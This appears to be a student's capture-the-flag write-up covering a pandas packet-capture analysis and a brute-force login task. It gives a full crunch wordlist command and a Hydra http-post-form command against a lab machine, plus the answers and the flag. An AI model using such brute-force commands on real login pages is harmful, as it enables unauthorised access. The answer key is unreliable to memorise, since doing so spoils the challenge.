## Day 2 Log Analysis
How many packets were captured (looking at the PacketNumber)?
Input: ``df.count()`` gives the packet number. Another way is to simply write ``df`` and the table printed will show the number of packets from start to finish.

Answer: ``100``  
What IP address sent the most amount of traffic during the packet capture?  
Input: Using the code ``df.groupby(['Source']).size()`` gives a list of ip addresses and the traffic they sent.

Answer: ``10.10.1.4``  
What was the most frequent protocol?  
Input: Either using ``df['Protocol'].value_counts()`` or ``df.groupby(['Protocol']).size()`` will give the table of Protocols used and their traffic.

Answer: ``ICMP``  
## Day 3 Brute Forcing  
What is the flag?  
Input: Visiting the login page. Using the ``crunch 3 3 0123456789ABCDEF -o 3digits.txt`` command to create a file with all the possible passwords.

Viewing Page source of the login page to find the method, server URL and name of input value. ``Method=post`` Action="login.php" so login ``URL=http://(My MachineIP):8000/login.php`` and ``name="pin"``

Now using Hydra ``hydra -l '' -P 3digits.txt -f -v 10.10.211.75 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`` I brute force the password(6F5).  
Answer: ``THM{pin-code-brute-force}``
